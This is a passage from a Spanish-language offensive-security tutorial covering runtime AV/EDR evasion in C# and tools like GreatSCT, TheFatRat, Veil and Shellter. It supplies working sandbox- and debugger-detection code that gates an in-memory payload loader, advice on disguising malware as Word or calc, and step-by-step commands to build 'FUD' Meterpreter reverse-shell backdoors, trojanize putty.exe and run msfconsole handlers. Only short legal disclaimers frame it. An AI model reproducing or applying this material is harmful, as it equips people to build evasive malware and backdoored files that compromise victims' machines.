📌 Así no necesitas dejar rastros en disco ni en rutas visibles.

---

#### ✅ 4. **Uso de nombres y comportamientos benignos**

Cambiar el nombre del proceso, ventanas, iconos o comportamientos para parecer legítimos.

```csharp
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "calc.exe"; // pero en realidad se ejecuta otra cosa
psi.Arguments = "&& malware.exe";
```

💡 También se puede compilar el EXE con íconos de Word, Excel, etc.

---

#### ✅ 5. **Uso de macros C# para inyección tardía**

Ejecutar código solo después de verificar que el entorno es seguro (ej. no hay sandbox, debugger, etc.).

```csharp
if (!Debugger.IsAttached && !IsRunningInVM())
{
    // Ejecutar payload
}
```

Usar funciones para detectar si estás dentro de un entorno de análisis:

- ¿Hay procesos como `Wireshark`, `Procmon`, etc.?
- ¿La CPU es virtual?
- ¿La RAM es mínima?

---

### 💻 Instalación del entorno para practicar

1. **Visual Studio Community** (gratis):
   [https://visualstudio.microsoft.com/es/](https://visualstudio.microsoft.com/es/)

2. Crea un nuevo proyecto: `Consola (.NET Framework o .NET Core)`

3. Usa estas librerías:

   - `System.Reflection`
   - `System.Diagnostics`
   - `System.Runtime.InteropServices`

---

### ✅ Ejemplo completo (evasión por ejecución en memoria + detección de análisis)

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

class Program
{
    static bool IsAnalysisEnvironment()
    {
        string[] tools = { "procmon", "wireshark", "fiddler", "ollydbg" };

        foreach (Process p in Process.GetProcesses())
        {
            foreach (string tool in tools)
            {
                if (p.ProcessName.ToLower().Contains(tool)) return true;
            }
        }

        return false;
    }

    static void Main()
    {
        if (IsAnalysisEnvironment())
        {
            Console.WriteLine("Entorno sospechoso detectado. Saliendo.");
            return;
        }

        byte[] payload = File.ReadAllBytes("payload.exe");
        Assembly asm = Assembly.Load(payload);
        MethodInfo entry = asm.EntryPoint;
        object instance = asm.CreateInstance(entry.Name);
        entry.Invoke(instance, new object[] { new string[] { } });
    }
}
```

🎯 Este programa:

1. Verifica si hay herramientas de análisis abiertas.
2. Si no las detecta, ejecuta un payload desde memoria.

---

### 📚 Recomendaciones para practicar

1. **VM con Windows Defender activado**
2. Usa herramientas para ver si el AV lo detecta:

   - [Any.Run](https://any.run/)
   - [JoeSandbox](https://www.joesandbox.com/)

3. Analiza el archivo compilado con:

   - PEStudio
   - Detect It Easy
   - VirusTotal (opcional y con precaución)

---

### 🧠 En resumen

| Técnica                 | Descripción                                           |
| ----------------------- | ----------------------------------------------------- |
| `Assembly.Load`         | Ejecutar código sin escribir en disco                 |
| `DllImport` + Shellcode | Cargar y ejecutar código en memoria                   |
| Recursos incrustados    | Ocultar binarios dentro del EXE                       |
| Evitar análisis         | Detectar herramientas como `procmon`, `fiddler`, etc. |
| Engaño visual           | Imitar procesos conocidos o inocentes                 |

---

[🔼](#índice)

---

## **348. Evasión de detección en tiempo de ejecución**

### 🧠 ¿Qué es la evasión de detección en tiempo de ejecución?

Es el proceso de ocultar o disfrazar el comportamiento de un programa **mientras se está ejecutando**, para evitar ser detectado por:

- Antivirus (AV)
- EDR (Endpoint Detection & Response)
- Sandboxes (entornos automáticos de análisis)
- Sistemas de monitoreo de seguridad

A diferencia de la evasión **estática** (que actúa antes de ejecutar, como ofuscación del código), esta técnica **detecta o responde al entorno durante la ejecución del programa**.

---

### 🎯 Objetivo

El objetivo es evitar que:

- El programa sea detenido automáticamente.
- Se genere una alerta o reporte.
- Se analice automáticamente en una sandbox.

---

### 🧩 Técnicas comunes de evasión en tiempo de ejecución

A continuación te detallo varias técnicas con ejemplos fáciles de entender en C#.

---

#### ✅ 1. **Detección de sandbox o análisis automático**

Antes de ejecutar el payload, el programa revisa si está dentro de un entorno de análisis o máquina virtual.

```csharp
using System;
using System.Management;

public class Program
{
    static bool IsVirtualMachine()
    {
        var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
        foreach (var item in searcher.Get())
        {
            string manufacturer = item["Manufacturer"].ToString().ToLower();
            if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox"))
                return true;
        }
        return false;
    }

    public static void Main()
    {
        if (IsVirtualMachine())
        {
            Console.WriteLine("Ejecutándose en máquina virtual. Abortando...");
            return;
        }

        Console.WriteLine("Sistema limpio. Continuando ejecución...");
        // Aquí iría tu payload real
    }
}
```

🔍 Este código aborta si detecta que corre en un entorno de análisis.

---

#### ✅ 2. **Sleep + comprobación del tiempo (anti-sandbox)**

Muchas sandboxes aceleran la ejecución (por ejemplo, hacen que `Sleep` dure solo milisegundos). Si se detecta esta manipulación, el programa se detiene.

```csharp
using System;
using System.Diagnostics;
using System.Threading;

class Program
{
    static void Main()
    {
        var sw = Stopwatch.StartNew();
        Thread.Sleep(5000);  // 5 segundos
        sw.Stop();

        if (sw.ElapsedMilliseconds < 4500)
        {
            Console.WriteLine("Posible sandbox detectado. Abortando...");
            return;
        }

        Console.WriteLine("Tiempo normal. Continuando...");
        // Ejecutar payload real aquí
    }
}
```

🧠 Esta técnica simple evita ser ejecutado en entornos que "saltan" instrucciones para ahorrar tiempo.

---

#### ✅ 3. **Evitar ejecución si hay procesos sospechosos**

Buscar procesos conocidos como `wireshark`, `procmon`, `x64dbg`, etc.

```csharp
using System.Diagnostics;

bool IsBeingAnalyzed()
{
    string[] suspicious = { "wireshark", "procmon", "x64dbg", "fiddler", "ida" };

    foreach (Process p in Process.GetProcesses())
    {
        foreach (string name in suspicious)
        {
            if (p.ProcessName.ToLower().Contains(name))
                return true;
        }
    }
    return false;
}
```

---

#### ✅ 4. **Evitar ejecución si hay poca RAM o poca CPU (VM detection)**

Muchas VMs de análisis tienen recursos mínimos asignados.

```csharp
using Microsoft.VisualBasic.Devices;

bool IsLowResourceMachine()
{
    ComputerInfo ci = new ComputerInfo();
    ulong totalMemory = ci.TotalPhysicalMemory;

    return totalMemory < (2UL * 1024 * 1024 * 1024); // Menos de 2GB RAM
}
```

---

#### ✅ 5. **Uso de código cifrado (desencriptar al vuelo)**

Cifras el payload en el ejecutable, y lo descifras **solo si las condiciones anteriores se cumplen**.

```csharp
string base64Payload = "TVqQAAMAAAAEAAAA//..."; // binario en base64

byte[] exeBytes = Convert.FromBase64String(base64Payload);
Assembly asm = Assembly.Load(exeBytes);
MethodInfo entry = asm.EntryPoint;
entry.Invoke(null, new object[] { new string[] { } });
```

---

### 🧰 ¿Cómo lo instalo y pruebo?

#### 🔧 Requisitos

1. **Visual Studio** o `dotnet CLI`
2. Crea un nuevo proyecto de tipo `Consola .NET`

```bash
dotnet new console -n runtime-evasion
cd runtime-evasion
```

#### 🛠️ Compilar

```bash
dotnet build -c Release
```

---

### ✅ Ejemplo completo final: Evasión + ejecución de payload cifrado

```csharp
using System;
using System.Diagnostics;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;

class Program
{
    static bool IsSandbox()
    {
        string[] suspicious = { "wireshark", "procmon", "x64dbg", "fiddler" };
        foreach (Process p in Process.GetProcesses())
        {
            foreach (string name in suspicious)
            {
                if (p.ProcessName.ToLower().Contains(name)) return true;
            }
        }

        var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
        foreach (var item in searcher.Get())
        {
            string manufacturer = item["Manufacturer"].ToString().ToLower();
            if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox")) return true;
        }

        var sw = Stopwatch.StartNew();
        Thread.Sleep(4000);
        sw.Stop();

        return sw.ElapsedMilliseconds < 3000;
    }

    static void Main()
    {
        if (IsSandbox())
        {
            Console.WriteLine("Entorno inseguro detectado. Abortando...");
            return;
        }

        Console.WriteLine("Ejecutando payload en entorno seguro...");

        // Payload simulado en base64 (normalmente sería shellcode o exe ofuscado)
        string payloadBase64 = "TVqQAAMAAAAEAAAA..."; // <-- pon aquí tu payload real
        byte[] payloadBytes = Convert.FromBase64String(payloadBase64);
        Assembly asm = Assembly.Load(payloadBytes);
        asm.EntryPoint.Invoke(null, new object[] { new string[] { } });
    }
}
```

---

### 🧪 ¿Cómo probar que funciona?

1. Ejecuta tu EXE en una **máquina física**: debería ejecutarse.
2. Ejecuta en una **máquina virtual** con herramientas abiertas: debería **no ejecutar** el payload.
3. Puedes cambiar el payload por algo visual como un `MessageBox.Show(...)` para validar.

---

### 📌 Conclusión

| Técnica               | ¿Qué hace?                                   |
| --------------------- | -------------------------------------------- |
| Detección de sandbox  | Verifica si está en VM o entorno de análisis |
| Chequeo de tiempo     | Detecta si se acelera la ejecución           |
| Detección de procesos | Busca herramientas de análisis               |
| Detección de recursos | Evalúa si hay poca RAM o CPU                 |
| Payload cifrado       | Se oculta hasta que se cumple una condición  |

Estas técnicas son muy usadas en **malware avanzado**, pero también en **red teaming legal** y **pruebas de penetración defensiva**.

---

[🔼](#índice)

---

## **349. Evasión con GreatSCT**

### 🧠 ¿Qué es GreatSCT?

**GreatSCT** (Great Shellcode Compiler Tool) es una herramienta diseñada para **bypassear (evadir)** antivirus y soluciones EDR al generar **payloads ofuscados**.

Funciona como un generador de **payloads personalizados en C#, Python, PowerShell y VBA**, usando técnicas de ofuscación y empacado para que los motores AV no lo detecten fácilmente.

📌 Lo que hace:

- Genera shellcodes ofuscados (usualmente desde `msfvenom`)
- Los empaqueta dentro de scripts legítimos
- Aplica técnicas anti-análisis

---

### ⚙️ Requisitos para instalarlo

- Kali Linux, Parrot, BlackArch o Ubuntu
- Python 2.7
- Ruby y msfvenom (de Metasploit)
- Wine (para compilar EXE en C#)

---

### 🛠️ Instalación paso a paso

#### 1. Clona el repositorio

```bash
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT
```

#### 2. Instala las dependencias

```bash
./setup.sh
```

Este script instala:

- `python2`
- `wine`
- `mono-complete`
- `msfvenom`
- Compiladores como `mingw32`

> Si tienes errores con Python 2, instala con:
> `sudo apt install python2 && sudo apt install python-pip`

#### 3. Ejecuta la herramienta

```bash
./GreatSCT.py
```

---

### 🧪 ¿Cómo funciona?

GreatSCT tiene dos módulos principales:

1. `--payload`: Crea un nuevo payload
2. `--shellcode`: Inserta shellcode en una plantilla

Ambos permiten elegir el lenguaje, el tipo de evasión y el formato de salida.

---

### 🧰 Ejemplo básico: Crear un payload EXE evasivo

#### Paso 1: Ejecutar la herramienta

```bash
./GreatSCT.py --payload
```

#### Paso 2: Elegir el tipo de payload

Elige:

```
1) windows/meterpreter/reverse_https
```

#### Paso 3: Especificar LHOST y LPORT

```
Enter LHOST: 192.168.1.10
Enter LPORT: 4444
```

#### Paso 4: Elegir el lenguaje para generar

Selecciona:

```
2) csharp (C#)
```

#### Paso 5: Nombre del archivo de salida

```
output_file: backdoor.cs
```

> Esto generará un archivo `backdoor.cs` con shellcode insertado y técnicas de evasión.

#### Paso 6: Compilarlo a EXE

Usa `mono` o `wine`:

```bash
xbuild backdoor.cs
# o
mcs backdoor.cs -out:backdoor.exe
```

---

### 🔥 Ejemplo completo: Payload Meterpreter evasivo

**Supongamos** que quieres generar un backdoor que se conecte de vuelta a tu máquina con `msfconsole`.

#### 1. Ejecutas GreatSCT:

```bash
./GreatSCT.py --payload
```

#### 2. Configuras:

```
Payload: windows/meterpreter/reverse_https
LHOST: 192.168.56.1
LPORT: 443
Language: C#
```

#### 3. Se genera el archivo `payload.cs`.

#### 4. Lo compilas:

```bash
mcs payload.cs -out:payload_evasion.exe
```

#### 5. Configuras el listener en `msfconsole`:

```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.56.1
set LPORT 443
exploit
```

#### 6. Ejecutas `payload_evasion.exe` en la máquina víctima (laboratorio).

🎯 Resultado: El payload conecta al handler y abre una sesión Meterpreter, evadiendo muchos antivirus.

---

### 📌 Técnicas de evasión usadas por GreatSCT

- Codificación del shellcode (XOR, Base64, RC4)
- Inyección directa en memoria (evita escribir a disco)
- Plantillas limpias en C#, PowerShell y VBA
- Compilación runtime en C# o VBScript

---

### 🛡️ ¿Detectan los AV modernos esto?

Muchos antivirus modernos **detectan GreatSCT** si se usa sin modificar. Pero si tú:

- Editas manualmente el C#
- Cambias el orden del código
- Aplicas cifrado o empaquetado adicional

👉 puedes lograr **evasión total en entornos de laboratorio**.

---

### ✅ Conclusión

| Punto clave                   | Descripción                                     |
| ----------------------------- | ----------------------------------------------- |
| **GreatSCT**                  | Herramienta para generar payloads que evaden AV |
| **Usa msfvenom**              | Integra shellcodes de Metasploit                |
| **Salida en C#, Python, PS1** | Facilita la evasión AV                          |
| **Ideal para pruebas**        | En laboratorios de red teaming y pentesting     |

---

[🔼](#índice)

---

## **350. Evasión con TheFatRat**

### 🧠 ¿Qué es TheFatRat?

**TheFatRat** es una herramienta de código abierto que permite generar **payloads maliciosos (backdoors)** para sistemas Windows, Android y Linux, con el objetivo de establecer una conexión remota con el atacante (reverse shell o meterpreter).

Su objetivo principal es:

- **Automatizar la creación de payloads**
- **Ofuscar el código para evadir antivirus**
- **Empaquetar el payload en archivos legítimos (como PDF, APK, EXE, etc.)**

---

### 🛠️ ¿Qué puede hacer?

- Crear payloads con `msfvenom` para Windows/Android/Linux
- Incorporarlos en archivos legítimos (bind con software real)
- Evasión antivirus con herramientas como `Veil-Evasion`, `pyherion`, `backdoor-factory`, etc.
- Crear listeners automáticamente con `Metasploit`

---

### ✅ Instalación de TheFatRat (paso a paso)

#### 📌 Requisitos:

- Kali Linux o Ubuntu
- `git`, `wine`, `mono`, `metasploit-framework`, `mingw`, `python2`, etc.

---

#### 1. Clonar el repositorio

```bash
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
```

---

#### 2. Dar permisos de ejecución

```bash
chmod +x setup.sh
chmod +x fatrat
```

---

#### 3. Ejecutar el instalador

```bash
sudo ./setup.sh
```

Esto descargará e instalará automáticamente:

- `mingw-w64`
- `pyinstaller`
- `wine`
- `backdoor-factory`
- `msfvenom`
- `mono-complete`
- Compiladores y otras dependencias

🔁 El proceso puede tomar varios minutos.

---

#### 4. Ejecutar la herramienta

```bash
sudo ./fatrat
```

Verás un **menú interactivo** como este:

```
1) Create FUD backdoor with msfvenom
2) Create FUD backdoor with Evasion tools
3) Create Android FUD backdoor
4) Create a Backdoored File
...
```

---

### ✅ Ejemplo completo: Crear un payload EXE para Windows y evadir antivirus

> **Objetivo**: Generar un backdoor `.exe` que abra una conexión reverse Meterpreter a Kali.

---

#### Paso 1: Ejecutar TheFatRat

```bash
sudo ./fatrat
```

---

#### Paso 2: Escoger la opción 1

```
1) Create FUD backdoor with msfvenom
```

---

#### Paso 3: Seleccionar payload

```
1) windows/meterpreter/reverse_tcp
```

---

#### Paso 4: Configurar IP y puerto

```
LHOST: 192.168.56.1      # IP de tu Kali Linux
LPORT: 4444              # Puerto abierto
```

---

#### Paso 5: Nombre del archivo de salida

```
Output filename: backdoor_evasion.exe
```

TheFatRat ahora generará:

- Shellcode con `msfvenom`
- Empaque del payload en C (usando `mingw32`)
- Evasión mediante codificación y ofuscación
- Compilación de archivo final `.exe`

💾 **Archivo generado:** `backdoor_evasion.exe`

---

#### Paso 6: Iniciar el listener en Metasploit

```bash
msfconsole
```

```ruby
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

---

#### Paso 7: Ejecutar el payload en la máquina víctima (laboratorio Windows)

Una vez se ejecute `backdoor_evasion.exe`, se establece la conexión **reverse shell**, y tendrás acceso como si estuvieras dentro del sistema:

```
Meterpreter > sysinfo
Meterpreter > screenshot
```

---

### 🧪 ¿Por qué evade antivirus?

TheFatRat usa:

- **Ofuscación de shellcode** (XOR, Base64, RC4)
- **Empaque con C** para parecer legítimo
- **Uso de `mingw` para compilarlo en Windows**
- **Evita firmas comunes detectadas por AV**

🔐 Si combinas esto con técnicas como cambiar icono, firmar código, o usar crypters, puedes mejorar aún más la evasión.

---

### 🧠 Resumen de comandos

```bash
# Clonar y configurar
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh fatrat
sudo ./setup.sh

# Ejecutar
sudo ./fatrat
```

---

### 🚨 Advertencia legal

> Esta herramienta debe ser usada **solo con fines educativos y en entornos controlados** (máquinas virtuales, laboratorios personales).
>
> No está permitido usarla contra sistemas sin autorización. Su uso indebido **puede ser ilegal**.

---

[🔼](#índice)

---

## **351. Otras herramientas de evasión: Veil, Shellter, MSFManía**

### 🛠️ Tema: Otras herramientas de evasión

#### Veremos:

| Herramienta  | Descripción corta                              |
| ------------ | ---------------------------------------------- |
| **Veil**     | Generador de payloads FUD (Fully Undetectable) |
| **Shellter** | Inyecta shellcode en archivos EXE legítimos    |
| **MSFManía** | Automatiza la creación de payloads y listeners |

---

### 🔐 1. **Veil Framework**

#### 📌 ¿Qué es Veil?

**Veil** es una herramienta para generar payloads que evadan antivirus (FUD). Está escrita en Python y permite generar _executables maliciosos_ con distintas técnicas de ofuscación.

Veil usa:

- Shellcode generado por `msfvenom`
- Cifrados personalizados (AES, RC4, etc.)
- Envoltura en lenguajes como Python, PowerShell o C

---

#### 🔧 Instalación de Veil (Kali Linux)

```bash
sudo apt update
sudo apt install veil
```

O manual:

```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
sudo ./config/setup.sh --force --silent
```

Esto instala:

- Dependencias (Python 2.7, Wine, PyInstaller)
- Metasploit
- Compiladores para EXE

---

#### ▶️ Ejemplo: Payload Meterpreter evadiendo AV

1. Ejecuta Veil:

```bash
sudo veil
```

2. Escribe:

```bash
use 1      # Powershell payloads
```

3. Luego:

```bash
list       # Muestra los disponibles
```

Selecciona:

```bash
use powershell/meterpreter/rev_tcp
```

4. Configura:

```
set LHOST 192.168.1.10
set LPORT 4444
generate
```

5. Compila:

Veil creará un `.bat` o `.exe` FUD como:

```
/usr/share/veil/output/compiled/RevMeterpreter.exe
```

6. En Kali, corre Metasploit:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

---

### 🐚 2. **Shellter**

#### 📌 ¿Qué es Shellter?

**Shellter** es una herramienta para **inyectar shellcode** en archivos `.exe` legítimos (como Notepad o Putty), de forma **dinámica y evasiva**.

Funciona en Windows y es ideal para usar con Wine en Kali.

---

#### 🔧 Instalación de Shellter

1. Descarga desde [https://www.shellterproject.com/download](https://www.shellterproject.com/download)

2. Extrae el ZIP:

```bash
unzip shellter.zip -d shellter
cd shellter
```

3. Ejecuta con Wine:

```bash
wine shellter.exe
```

---

#### ▶️ Ejemplo: Infectar un EXE legítimo

1. Copia `putty.exe` en la carpeta de Shellter.

2. Ejecuta Shellter:

```bash
wine shellter.exe
```

3. Escoge:

```
[*] Operation Mode: Auto
[*] Enable Stealth Mode? Y
[*] Path to executable: putty.exe
```

4. Te pedirá el payload:

```
Use custom shellcode? N
Select payload: windows/meterpreter/reverse_tcp
```

5. Configura:

```
LHOST: 192.168.1.10
LPORT: 4444
```

Shellter inyectará el shellcode dentro de `putty.exe` manteniendo su funcionalidad. ¡Parece un archivo legítimo!

---

### 🎯 3. **MSFManía**

#### 📌 ¿Qué es MSFManía?

**MSFManía** es un script automatizado (normalmente en Bash) que facilita:

- Crear múltiples payloads de Metasploit
- Configurar `msfconsole` con handlers automáticamente
- Organizar tus pruebas en red teaming

Ideal para principiantes que quieren automatizar y hacer pruebas rápidas.

---

#### 🔧 Instalación de MSFManía

1. Clona el repositorio:

```bash
git clone https://github.com/OffensivePython/MSFMania.git
cd MSFMania
chmod +x msfmania.sh
```

2. Ejecuta el script:

```bash
./msfmania.sh
```

---

#### ▶️ Ejemplo: Crear múltiples payloads automáticamente

Al ejecutar MSFManía, verás un menú como:

```
1) Payloads para Windows
2) Payloads para Android
3) Payloads para Linux
...
```

Seleccionas uno, colocas tu `LHOST` y `LPORT`, y él genera múltiples variantes:

- `.exe`
- `.bat`
- `.py`
- `.ps1`
- `.vbs`

Todo en carpetas organizadas, y también configura los **handlers en Metasploit** por ti.

---

### 🔚 Resumen Comparativo

| Herramienta  | Técnica principal                     | Formato de salida              | Ideal para                  |
| ------------ | ------------------------------------- | ------------------------------ | --------------------------- |
| **Veil**     | Ofuscación y cifrado del shellcode    | .exe, .bat, .ps1               | Payloads limpios y evasivos |
| **Shellter** | Inyección en binarios legítimos       | EXE infectado                  | Ingeniería social / stealth |
| **MSFManía** | Automatización de msfvenom + handlers | Varios (.exe, .apk, .py, etc.) | Automatizar laboratorios    |

---

### 💡 Conclusión

Estas herramientas son muy usadas en **red teaming, pentesting ofensivo y laboratorios de evasión AV**. Permiten generar payloads más difíciles de detectar, simulando mejor a los atacantes reales.

> ⚠️ **Úsalas solo en entornos controlados y con autorización. No están permitidas para fines ilegales.**

---

[🔼](#índice)

---

| **Inicio**         | **atrás 4**                                                      | **Siguiente 6**                                          |
| ------------------ | ---------------------------------------------------------------- | -------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./5_4_Hacking_avanzado_de_aplicaciones_web_y_bug_bounty.md) | [⏩](./5_6_Hacking_etico_y_post_explotacion_avanzada.md) |
